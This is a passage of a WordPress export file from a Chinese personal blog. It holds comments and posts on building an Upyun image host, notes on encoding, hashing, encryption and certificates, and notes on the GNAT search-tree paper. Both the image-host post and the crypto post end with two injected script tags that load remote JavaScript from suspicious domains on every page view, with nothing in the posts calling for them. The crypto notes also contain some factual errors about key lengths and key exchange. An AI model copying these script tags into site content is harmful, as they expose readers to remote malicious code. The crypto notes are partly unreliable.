		<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>6</wp:comment_id>
			<wp:comment_author><![CDATA[测试员一号]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[zhangzimasd@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[223.72.72.79]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2021-06-18 23:23:57]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2021-06-18 15:23:57]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[测试一下评论功能zzz]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_result]]></wp:meta_key>
			<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[a:2:{s:4:"time";d:1624029837.1610031;s:5:"event";s:9:"check-ham";}]]></wp:meta_value>
			</wp:commentmeta>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[a:3:{s:4:"time";d:1624029926.806812;s:5:"event";s:15:"status-approved";s:4:"user";s:14:"protectione055";}]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>7</wp:comment_id>
			<wp:comment_author><![CDATA[漩涡鸣人Zz]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[549012402@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url>http://www.ironmanzzm.top</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[223.72.93.193]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2021-06-18 23:27:08]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2021-06-18 15:27:08]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[能显示默认头像了，好耶]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>6</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_result]]></wp:meta_key>
			<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[a:3:{s:4:"time";d:1624030028.1510251;s:5:"event";s:9:"check-ham";s:4:"user";s:14:"protectione055";}]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					</item>
					<item>
		<title><![CDATA[使用又拍云搭建自己的图床]]></title>
		<link>http://www.ironmanzzm.top/?p=203</link>
		<pubDate>Sat, 19 Jun 2021 08:19:59 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/?p=203</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:list -->
<ul><li>前言</li><li>图床搭建</li><li>使用PicGo管理图床</li></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2>前言</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>使用markdown写文章的时候可以在文章中插入图片。如果引用的图片存储在本地，将文章发布到其他地方的时候就要将所有图片上传到部署的服务器上，然后文章中的引用路径也要全部修改一遍，非常麻烦。如果搭建一个可以在公网访问的图床，就可以从同一个地方引用资源，不用每次发布都重复修改路径。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>公用的免费图床有 https://sm.ms，之前使用了一段时间，发现放到博客的图片时不时会挂掉。听说又拍云推出了白嫖活动，赶紧研究一下怎么样用他们家的云存储服务搭一个私有图床。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>图床搭建</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>第一步 申请加入又拍云联盟</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>又拍云每个月为加入又拍云联盟的开发者提供10GB存储空间和15GB流量，对于我们的小破站来说绰绰有余了。</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol><li>首先点击--&gt;<a href="https://www.upyun.com/league">又拍云联盟</a>，注册账号。</li><li>申请加入前需要在网站页脚加一个又拍云的logo。wordpress博客进入后台，找到<code>外观-&gt;主题编辑器-&gt;footer.php</code>，在页脚版权信息对应的标签后插入以下代码</li></ol>
<!-- /wp:list -->

<!-- wp:code -->
<pre class="wp-block-code"><code>&lt;!--             Upyun logo               --&gt;
&lt;div class="upyun-logo"&gt;
    &lt;span&gt;本网站由&lt;/span&gt;
    &lt;a class="upyun-logo-ref" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referral" target="blank"&gt;
        &lt;img class="upyun-img" align="bottom" height="18" src="https://i.loli.net/2021/06/19/zgdbal6fjnuEPLO.png" alt="又拍云"&gt;
    &lt;/a&gt;
    &lt;span&gt;提供 CDN 加速/云存储服务&lt;/span&gt;
&lt;/div&gt;</code></pre>
<!-- /wp:code -->

<!-- wp:list {"ordered":true,"start":3} -->
<ol start="3"><li>确认Logo样式没问题以后回去填写申请表，工作日不到三分钟就能批下来。申请成功后会一次性发放12个月的代金券。</li></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3>第二步 创建云存储服务</h3>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><li>找到云存储入口<br><img src="http://img.ironmanzzm.top/blog-img/%E8%BF%9B%E5%85%A5%E4%BA%91%E5%AD%98%E5%82%A8.jpg" alt="进入云存储"></li><li>点击创建服务，填写服务名称。输入操作员名称后保存好密钥，勾选所有权限。点击创建。<br><img src="http://img.ironmanzzm.top/blog-img/%E9%85%8D%E7%BD%AE%E4%BA%91%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1.jpg" alt="创建服务"></li></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3>第三步 域名绑定到服务器</h3>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><li>创建成功后可以看到如下信息框，点进入配置。<br><img src="http://img.ironmanzzm.top/blog-img/%E5%88%9B%E5%BB%BA%E6%88%90%E5%8A%9F.jpg" alt="创建成功.jpg"></li><li>服务创建好以后又拍云自动为我们的云存储服务器生成了CNAME，我们把图床域名绑定到他给的CNAME才能正常访问。点击域名绑定，输入<code>img.你自己的域名</code>，比如我绑定的就是<code>img.ironmanzzm.top</code>。<br><img src="http://img.ironmanzzm.top/blog-img/%E4%BA%91%E5%AD%98%E5%82%A8%E9%85%8D%E7%BD%AE%E9%A1%B5.jpg" alt="云存储配置页.jpg"></li><li>绑定好域名后要到DNS服务商添加CNAME解析记录。以阿里为例，进入<code>控制台-&gt;云解析DNS-&gt;解析设置</code>。点击添加记录后选择记录类型为CNAME，将<code>img.你的域名</code>解析到又拍云给的CNAME. 做完这步以后去ping这个二级域名，就会发现可以收到来自图片服务器的响应了，大功告成。<br><img src="http://img.ironmanzzm.top/blog-img/%E6%B7%BB%E5%8A%A0CNAME%E8%AE%B0%E5%BD%95.jpg" alt="添加CNAME记录.jpg"></li></ol>
<!-- /wp:list -->

<!-- wp:heading -->
<h2>图床使用</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>云存储服务器创建好以后，虽然又拍云提供网页端的文件管理服务，但每次进去都要登录，用起来不太方便。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>图床工具PicGo让我们可以通过桌面客户端管理云存储器，目前支持微博，七牛云，腾讯云COS，又拍云，GitHub，阿里云OSS，SM.MS，imgur 等常用图床。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>下载地址：https://github.com/Molunerfinn/PicGo/releases</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>安装好后进入<code>图床设置-&gt;又拍云图床</code>，填入云存储服务器信息，设为默认图库。通过PicGo上传的图片会存储到指定的路径中，从相册可以复制不同格式的图片路径。需要注意的是在PicGo中点删除图片只是从相册中隐藏了，云存储服务器上还会保留，有洁癖的同学需要自行到网页端文件管理里面删除。<br><img src="http://img.ironmanzzm.top/blog-img/PicGo%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE.jpg" alt=""></p>
<!-- /wp:paragraph --><script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[使用markdown写文章的时候可以在文章中插入图片。如果引用的图片存储在本地，将文章发布到其他地方的时候就要将所有图片上传到部署的服务器上，然后文章中的引用路径也要全部修改一遍，非常麻烦。如果搭建一个可以在公网访问的图床，就可以从同一个地方引用资源，不用每次发布都重复修改路径。听说又拍云推出了白嫖活动，赶紧研究一下怎么样用他们家的云存储服务搭一个私有图床。]]></excerpt:encoded>
		<wp:post_id>203</wp:post_id>
		<wp:post_date><![CDATA[2021-06-19 16:19:59]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-19 08:19:59]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-19 16:21:42]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-19 08:21:42]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%a6%82%e4%bd%95%e6%90%ad%e5%bb%ba%e8%87%aa%e5%b7%b1%e7%9a%84%e5%9b%be%e5%ba%8a]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="%e5%8d%9a%e5%ae%a2"><![CDATA[博客]]></category>
		<category domain="post_tag" nicename="%e5%9b%be%e5%ba%8a"><![CDATA[图床]]></category>
		<category domain="category" nicename="web-operation-and-maintenance"><![CDATA[网站运维]]></category>
		<category domain="post_tag" nicename="%e7%bd%91%e7%ab%99%e8%bf%90%e7%bb%b4"><![CDATA[网站运维]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e6%8a%80%e6%9c%af"><![CDATA[计算机技术]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[204]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[计算机编码、加密算法与数字证书]]></title>
		<link>http://www.ironmanzzm.top/?p=214</link>
		<pubDate>Wed, 30 Jun 2021 15:09:22 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/?p=214</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:heading {"level":1} -->
<h1>前言</h1>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>这两天在鼓捣为网站申请SSL证书的事情，为了弄明白SSL协议是个什么东西，粗略地学习了一下计算机字符编码、摘要、加密算法相关的东西。本篇是学习过程记录的笔记，主要来源于参考资料中所列出的文章。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":1} -->
<h1>编码</h1>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>ASCII编码</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>用一字节表示字符，只能表示127个字符。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Unicode</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>这种编码是为世界上所有符号设计的一套统一编码。这套方案只规定了字符用什么数字进行编码，没有规定在计算机系统中如何存储这个数字。不同长度的数字如果用统一的字节数进行存储，那么较短的数字前就需要存储很多个0，造成存储空间的浪费。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>UTF-8</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>由于Unicode没有规定具体的实现方式，历史上出现了多种实现方式。UTF-8就是其中的一种。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>UTF-8 的编码规则很简单，只有二条：</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>1）对于单字节的符号，字节的第一位设为0，后面7位为这个符号的 Unicode 码。因此对于英语字母，UTF-8 编码和 ASCII 码是相同的。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>2）对于n字节的符号（n &gt; 1），第一个字节的前n位都设为1，第n + 1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的 Unicode 码。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>以汉字<code>严</code>为例，演示如何实现 UTF-8 编码。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>严</code>的 Unicode 是<code>4E25</code>（<code>100111000100101</code>），根据上表，可以发现4E25处在第三行的范围内（<code>0000 0800 - 0000 FFFF</code>），因此严的 UTF-8 编码需要三个字节，即格式是<code>1110xxxx 10xxxxxx 10xxxxxx</code>。然后，从严的最后一个二进制位开始，依次从后向前填入格式中的x，多出的位补0。这样就得到了，严的 UTF-8 编码是<code>11100100 10111000 10100101</code>，转换成十六进制就是<code>E4B8A5</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>大端/小端</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>以汉字严为例，Unicode 码是<code>4E25</code>，需要用两个字节存储，一个字节是<code>4E</code>，另一个字节是<code>25</code>。存储的时候，<code>4E</code>在前，<code>25</code>在后，这就是 <strong>Big endian</strong> 方式；<code>25</code>在前，<code>4E</code>在后，这是 <strong>Little endian</strong> 方式。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Unicode 规范定义，每一个文件的最前面分别加入一个表示编码顺序的字符，这个字符的名字叫做"零宽度非换行空格"（zero width no-break space），用<code>FEFF</code>表示。这正好是两个字节，而且<code>FF</code>比<code>FE</code>大1。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>如果一个文本文件的头两个字节是<code>FE FF</code>，就表示该文件采用大头方式；如果头两个字节是<code>FF FE</code>，就表示该文件采用小头方式。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":1} -->
<h1>哈希算法</h1>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>常用的哈希算法有MD5、SHA-1、SHA-256、SHA-512. 输出长度越长，产生碰撞的可能性就越小，算法也就越安全。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>使用哈希算法可以对文件进行校验，在数据库中存储用户口令<br>。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>MD5</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>对于任意长度的输入，使用MD5算法都能得到16字节的哈希值输出。MD5哈希值可以通过暴力穷举的方法破解，彩虹表是黑客为了节省算力而记录下来的“常用口令-MD5哈希值”对应关系。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>为了避免破解，通常的做法是在计算哈希值时，在输入中加上一个随机的数值，称为<code>salt</code>。数据库中保存salt和最终哈希值。加入salt的哈希值无法被彩虹表破解。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>SHA-1</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>…</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":1} -->
<h1>加密算法</h1>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>对称加密算法</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>使用同一个密码进行加密和解密。加密时输入原文和密钥，输出密文；解密时输入密文和密钥，输出原文。常见的对称加密算法有DES、AES和IDEA.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DES算法密钥长度为56字节或64字节，可以在短时间内被破解，是不安全的算法。使用最广泛的加密算法是AES.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>密钥交换算法</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>两人之间要进行加密通信的场景下，如果用对称加密算法，需要解决如何在不安全的信道上传输密钥的问题。由此产生的Diffie-Hellmen算法解决了双方不直接传递密钥的情况下如何完成密钥交换的问题。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DH交换算法的基本流程是主机甲生成私钥和公钥，将自己的公钥提供给另一台主机乙。主机乙随机生成一个私钥，然后输入自己的私钥和主机甲的公钥计算出自己的公钥。主机乙将生成的公钥发送给主机甲，这样交换完以后，主机甲和主机乙分别用对方的公钥和自己的私钥计算出来的密钥是一致的。在这个过程中，私钥始终没有在网络上传输，即使被第三者截获了两边的公钥，也无法得到密钥。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>密钥交换算法存在的问题是并不能防范中间人攻击，即主机甲和主机乙都不知道自己通信的是否第三者。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>非对称加密算法</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>非对称加密通信中，接收方将自己的公钥公开到网络。任何需要传送信息到接受方的主机会获取接受方的公钥，通过公钥加密原文，然后发送给接收方。接收方收到密文后使用自己的私钥解密得到原文。非对称加密算法的缺点是运算速度非常慢，因此不能完全替代对称加密算法。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>常用的非对称加密是RSA算法。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在HTTPS协议中，通常结合使用两种加密算法：在交换AES密钥时使用接收方RSA公钥加密AES密钥，接收方用RSA私钥解密得到对方的密钥。之后的文本加密都使用AES密钥加密，以减少内容接受方的计算量。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>签名算法</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>非对称算法使用公钥加密，私钥解密。这样可以保证发送给接收方的信息只有接收方一个人能看到。如果我们反过来，发送方用私钥加密信息，所有人只能用发送方的公钥进行解密，就可以构造一条无法被伪造的公开信息。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>实际使用的时候通常是对原始信息的哈希值进行签名，然后将解密后的哈希值和原始信息哈希值进行比对。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>常用数字签名算法有：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>MD5withRSA</li><li>SHA1withRSA</li><li>SHA256withRSA</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>除了RSA签名，还可以用DSA算法进行签名，优点是更快。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>数字证书</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>数字证书是集合摘要算法、非对称算法、签名算法等多种密码学算法，实现数据加解密、身份认证、签名等多种功能的一种安全标准。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>HTTPS协议是数字证书最典型的应用，浏览器通过证书验证网站的有效性。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>证书验证流程如下：</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol><li>权威的证书签发机构CA利用RSA算法生成一对公钥和私钥，利用自己的私钥为公钥、签发者ID、证书授予者、有效期等信息的哈希值进行签名，然后将明文信息和签名合在一起形成证书。</li><li>全球权威的证书签发机构为自己生成的证书被内置到软件中，作为根证书。</li><li>浏览器浏览获得CA认证的第三方网站时，会用根证书中的公钥验证网站的证书，如果验证通过，且数字证书中的URL与访问的URL一致，就可以使用证书中带有的公钥与服务器进行加密通信。</li></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>在SSL协议中，证书验证成功后，浏览器随机生成一个对称密钥，通过证书中的公钥加密发送给服务器。后续的加密通信就通过对称密钥进行加密与解密。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":1} -->
<h1>参考资料</h1>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><li>阮一峰. 字符编码笔记：ASCII，Unicode 和 UTF-8. <a href="https://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html" target="_blank" rel="noreferrer noopener">https://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html</a></li><li>廖雪峰. JAVA教程：加密与安全. <a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1255943717668160" target="_blank" rel="noreferrer noopener">https://www.liaoxuefeng.com/wiki/1252599548343744/1255943717668160</a></li><li>三一斜狩. 数字证书的原理是什么. <a href="https://www.zhihu.com/question/24294477?sort=created" target="_blank" rel="noreferrer noopener">https://www.zhihu.com/question/24294477?sort=created</a></li></ol>
<!-- /wp:list --><script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[本篇简单介绍了常见字符编码、哈希算法、加密算法与数字证书的基本原理。]]></excerpt:encoded>
		<wp:post_id>214</wp:post_id>
		<wp:post_date><![CDATA[2021-06-30 23:09:22]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-30 15:09:22]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-30 23:10:43]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-30 15:10:43]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%bc%96%e7%a0%81%e3%80%81%e5%8a%a0%e5%af%86%e7%ae%97%e6%b3%95%e4%b8%8e%e6%95%b0%e5%ad%97%e8%af%81%e4%b9%a6]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="ssl"><![CDATA[SSL]]></category>
		<category domain="post_tag" nicename="%e5%8a%a0%e5%af%86%e7%ae%97%e6%b3%95"><![CDATA[加密算法]]></category>
		<category domain="post_tag" nicename="%e7%bc%96%e7%a0%81"><![CDATA[编码]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e6%8a%80%e6%9c%af"><![CDATA[计算机技术]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[215]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{i:1;i:1;i:2;i:2;i:3;i:3;i:4;i:4;i:5;i:5;i:6;i:6;}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[GNAT：大度量空间中的近邻搜索]]></title>
		<link>http://www.ironmanzzm.top/?p=240</link>
		<pubDate>Sat, 11 Dec 2021 06:17:24 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/?p=240</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p>Sergey Brin</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>背景</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>大度量空间</strong>：一个度量空间，球的体积随着半径的增大增长得非常快。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>GNAT目的是解决大度量空间中的近邻查询问题。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>基因序列比对、声音识别、图片识别等数据都在分布上存在一定关联性，利用这些关联性可以提升近邻搜索的性能。为了达到这个目的，要求数据结构能够反映数据的内在几何特征。GNAT通过在多个层次上将数据分割为多个区域来保留基本几何结构。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>对比VPT，由于球外的空间总是比球内的大，在大度量空间中，球外的数据分布会变得非常稀疏，从而降低索引性能。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>算法</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>构建</h4>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><li>从需要建立索引的数据集选择<em>k</em>个划分点<em>p<sub>1</sub></em>,…,<em>p<sub>k</sub></em>，（也是一般所说的<strong>度</strong>），这些点是随机选取的，但我们保证它们之间<strong>相距比较远</strong>（fairly far apart）。</li><li>我们将剩余的点根据与它最近的划分点关联(associate)起来，将与划分点<em>P<sub>i</sub></em>关联的点集记为<em>D<sub>pi</sub></em></li><li>对于每一对划分点<code>(pi, pj)</code>，计算<code>range(pi, Dpj)=[mind_d(pi, Dpj), max_d(pi, Dpj)]</code>，即点<em>p<sub>i</sub></em>到点集<em>D<sub>pj</sub></em>距离的最大值和最小值。</li><li>递归地对每一个<em>D<sub>pj</sub></em>建树，可能使用不同的度。</li></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4>查询</h4>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><li>假设我们需要查找距离点<em>x</em>小于<em>r</em>的所有点，P表示当前结点的所有划分点（最开始是GNAT的头部结点）。最开始P包括当前结点的所有划分点。</li><li>从P中选取一个点p（这个点不会重复），计算距离<code>Dist(x, p)</code>，如果<code>Dist(x, p)&lt;=r</code>，将点<em>p</em>加入结果集中。</li><li>对于P中的所有点q，如果<code>[Dist(x, p)-r, Dist(x, p)+r] ∩ range(p, Dq)</code>为空集，那么就将q从P中移除。可以通过以下方法证明：假设<em>y</em>是<em>Dq</em>中的任意点，如果<code>Dist(y, p) &lt; Dist(x, p)-r</code>，那么根据三角不等式，我们可以得到<code>Dist(x, y)+Dist(y, p) &gt;= Dist(x, p)</code>，因此<code>Dist(x, y) &gt; r</code>. 另外，如果<code>Dist(y, p) &gt; Dist(x, p)+r</code>，我们可以由三角不等式<code>Dist(y, x)+Dist(x, p) &gt;= Dist(y, p)</code>得到<code>Dist(x, y) &gt; r</code>。 因此点<code>y</code>不可能落在范围<code>[Dist(x, p)-r, Dist(x, p)+r]</code>，不然会与range(p, Dq)出现交集。</li><li>对P中的剩余所有点重复步骤2和3</li><li>对于P中所有剩余的点p<sub>i</sub>，递归搜索D<sub>p</sub></li></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3>选择划分点</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>选点的时候我们希望划分点尽量地随机，这样就会使这些划分点更接近聚簇的中心点。如果选择的划分点比较接近，我们计算它们之间距离的时候得到的信息就会更少，因为不同两个分支之间计算得到的距离非常接近。在这，如果多个划分点处于同一个聚簇中，会将这个聚簇过度划分。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>首先随机选取一个候选点，然后选择离它最远的点作为第二个候选点，再选出离这两个点最远的第三个点（第三个点离前两个点距离的较小值是最大的）。以此类推，知道选出足够多的候选点作为划分点。这个过程可以通过动态规划算法进行，时间复杂度为O(mn)。其中n是候选点，m是最后划分点的数量。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>上述划分点选取过程将进行三次，选出的点成为候选点。然后选取最分散的候选点集。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>选择结点的度以及使树平衡</h3>
